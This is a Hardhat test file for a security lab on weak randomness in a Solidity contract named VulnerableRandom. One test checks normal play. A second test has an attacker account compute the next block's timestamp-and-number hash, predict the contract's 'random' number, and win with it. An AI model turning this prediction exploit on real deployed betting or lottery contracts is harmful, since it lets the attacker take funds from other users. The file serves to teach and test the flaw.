import { expect } from "chai";
import pkg from "hardhat";
const { ethers } = pkg;

describe("Randomness Vulnerability Lab", function () {

    async function deployVulnerable() {
        const Vulnerable = await ethers.getContractFactory("VulnerableRandom");
        const vulnerable = await Vulnerable.deploy();
        return { vulnerable };
    }

    it("should generate a number and allow normal play", async function () {
        const { vulnerable } = await deployVulnerable();

        const result = await vulnerable.play(5);

        expect(result).to.be.an("object");
        expect(result.hash).to.be.a("string");
        expect(result).to.have.property("from");

    });

    it("allows attacker to predict the random number and always win", async function () {
        const { vulnerable } = await deployVulnerable();
        const attacker = (await ethers.getSigners())[1];

        const currentBlock = await ethers.provider.getBlock("latest");

        const nextBlockNumber = currentBlock.number + 1;
        const nextTimestamp = currentBlock.timestamp + 1;

        const predictedRandom = Number(
            ethers.toBigInt(
                ethers.keccak256(
                    ethers.solidityPacked(["uint256", "uint256"], [nextTimestamp, nextBlockNumber])
                )
            ) % 10n
        );

        const tx = await vulnerable.connect(attacker).play(predictedRandom);

        const contractLastRandom = await vulnerable.lastRandom();

        expect(contractLastRandom).to.equal(predictedRandom);
    });
});